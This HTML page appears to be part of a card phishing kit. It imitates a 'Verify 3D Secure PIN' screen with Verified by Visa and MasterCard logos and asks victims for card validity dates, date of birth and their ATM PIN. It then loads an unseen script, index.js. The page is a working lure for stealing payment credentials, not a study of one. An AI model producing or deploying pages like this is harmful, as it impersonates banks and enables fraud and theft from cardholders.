<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Step 2</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
            <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
        </div>

            <h3>Verify 3D Secure PIN Step 1 of 2</h3>
            <p>Please provide the information in the space below, to confirm your identity.</p>
            <div class="inputBox">
                <label for="transactionId">Card Number:</label>
                <input type="text" id="transactionId" placeholder="XXXX XXXX XXXX XXXX" style="font-weight:bold;" readonly>
            </div>
    
            <div class="flex">
                <div class="inputBox">
                    <label for="expMonth">Valid From</label>
                    <div style="display: flex;">
                    <input type="text" id="expMonth" placeholder="MM" required>
                    <input type="text" id="expMonth" placeholder="YY" required>
                    </div>
                </div>
            </div>
            <div class="flex">
                <div class="inputBox">
                    <label for="expMonth">Date Of Birth:</label>
                    <div style="display: flex;">
                    <input type="text" id="expMonth" placeholder="DD" required>
                    <input type="text" id="expMonth" placeholder="MM" required>
                    <input type="text" id="expMonth" placeholder="YY" required>
                    </div>
                </div>
            </div>
            <div class="inputBox">
                <label for="cvv">ATM PIN</label>
                <input type="text" id="cvv" placeholder="Enter PIN" required>
            </div>
            <a href="index.html">
            <input type="submit" value="Submit" class="submit-btn">
            </a>
            <p class="timeout">This page will automatically timeout after 180 seconds</p>

    </div>
    <script src="index.js"></script>
</body>
